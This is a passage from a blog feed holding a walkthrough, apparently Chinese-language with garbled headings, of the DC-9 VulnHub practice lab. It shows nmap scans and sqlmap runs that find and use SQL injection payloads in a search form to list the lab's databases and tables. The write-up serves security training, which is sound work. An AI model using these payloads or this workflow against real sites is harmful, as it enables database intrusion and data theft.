</span></span><br><span class="line">*******************************</span><br><span class="line">root@admirer:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/09/05/HTB-admirer/image-20200905162252401.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>DC-9</title>
    <link href="https://lunamoore.github.io/2020/09/02/DC-9/"/>
    <id>https://lunamoore.github.io/2020/09/02/DC-9/</id>
    <published>2020-09-02T09:10:59.000Z</published>
    <updated>2020-09-02T09:16:46.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote><p>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p></blockquote><a id="more"></a><h2 id="0x01-è€è§„çŸ©nmap"><a href="#0x01-è€è§„çŸ©nmap" class="headerlink" title="0x01.è€è§„çŸ©nmap"></a>0x01.è€è§„çŸ©nmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ8å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 02:16 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80ç«¯å£ï¼Œå‘ç°sshçŠ¶æ€ä¸ºfilteredï¼ˆè¿‡æ»¤ï¼‰ï¼Œæ¨æµ‹å®‰è£…äº†knockd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># nmap -sC -sV -v 192.168.1.8 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 02:17 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 02:17</span><br><span class="line">Scanning 192.168.1.8 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 02:17, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 02:17</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 02:17, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 02:17</span><br><span class="line">Scanning 192.168.1.8 [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.8</span><br><span class="line">Completed SYN Stealth Scan at 02:17, 0.06s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 02:17</span><br><span class="line">Scanning 1 service on 192.168.1.8</span><br><span class="line">Completed Service scan at 02:17, 6.25s elapsed (1 service on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.8.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.91s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.92 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.064KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><p><code>å‘ç°äº†ä¸€äº›ç”¨æˆ·ï¼Œä¸€ä¸ªç™»å…¥æ¡†ï¼Œä¸€ä¸ªæœç´¢æ¡†ï¼Œå°±æ²¡æœ‰å…¶ä»–æœ‰ç”¨çš„ä¿¡æ¯äº†</code></p><img src="/2020/09/02/DC-9/image-20200902144807899.png" class><img src="/2020/09/02/DC-9/image-20200902144920353.png" class><img src="/2020/09/02/DC-9/image-20200902144932737.png" class><h2 id="0x04-æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹"><a href="#0x04-æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹" class="headerlink" title="0x04.æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹"></a>0x04.æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹</h2><h3 id="1-è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…"><a href="#1-è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…" class="headerlink" title="1.è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…"></a>1.è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…</h3><img src="/2020/09/02/DC-9/image-20200902145133305.png" class><h3 id="2-ç¼–è¾‘æ–‡ä»¶"><a href="#2-ç¼–è¾‘æ–‡ä»¶" class="headerlink" title="2.ç¼–è¾‘æ–‡ä»¶"></a>2.ç¼–è¾‘æ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># cat demo.txt </span></span><br><span class="line">POST /results.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">Content-Length: 8</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Origin: http://192.168.1.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.1.8/search.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: SESS6ea13d7ee6970decd87c6ae82c8909ff=6hCT-InqREqWsLqJQMvcblMzdjfBuTsTvOqLVecWfjs; PHPSESSID=pdng34438k3h323o5l59vk46k4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=1</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="3-æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥"><a href="#3-æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥" class="headerlink" title="3.æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥"></a>3.æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt --dbs --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [,]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 02:55:09 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:55:09] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing if POST parameter &#x27;search&#x27; is dynamic</span></span><br><span class="line"><span class="string">[02:55:10] [WARNING] POST parameter &#x27;search&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[02:55:10] [WARNING] heuristic (basic) test shows that POST parameter &#x27;search&#x27; might not be injectable</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing for SQL injection on POST parameter &#x27;search&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Generic inline queries&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line"><span class="string">[02:55:10] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] POST parameter &#x27;search&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable </span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] target URL appears to be UNION injectable with 6 columns</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] POST parameter &#x27;search&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span></span><br><span class="line"><span class="string">POST parameter &#x27;search&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:55:31] [INFO] fetching database names</span></span><br><span class="line"><span class="string">available databases [3]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] Staff</span></span><br><span class="line"><span class="string">[*] users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:55:31] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:55:31 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="4-æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff"><a href="#4-æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff" class="headerlink" title="4.æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff"></a>4.æ‰«æå½“å‰æ•°æ®åº“ï¼Œç»“æœä¸ºStaff</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt --dbs --batch --current-db</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 02:57:16 /2020-09-02/</span><br><span class="line"></span><br><span class="line">[02:57:16] [INFO] parsing HTTP request from <span class="string">&#x27;demo.txt&#x27;</span></span><br><span class="line">[02:57:16] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[02:57:16] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: search=1<span class="string">&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;</span>xHdu<span class="string">&#x27;=&#x27;</span>xHdu</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="line">    Payload: search=1<span class="string">&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:57:16] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:57:16] [INFO] fetching current database</span></span><br><span class="line"><span class="string">current database: &#x27;</span>Staff<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[02:57:17] [INFO] fetching database names</span></span><br><span class="line"><span class="string">available databases [3]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] Staff</span></span><br><span class="line"><span class="string">[*] users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:57:17] [INFO] fetched data logged to text files under &#x27;</span>/root/.<span class="built_in">local</span>/share/sqlmap/output/192.168.1.8<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:57:17 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="5-çˆ†è¡¨ï¼ŒUsers"><a href="#5-çˆ†è¡¨ï¼ŒUsers" class="headerlink" title="5.çˆ†è¡¨ï¼ŒUsers"></a>5.çˆ†è¡¨ï¼ŒUsers</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff --tables --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 02:59:07 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:59:07] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[02:59:07] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[02:59:07] [INFO] fetching tables for database: &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+--------------+</span></span><br><span class="line"><span class="string">| StaffDetails |</span></span><br><span class="line"><span class="string">| Users        |</span></span><br><span class="line"><span class="string">+--------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[02:59:07] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span 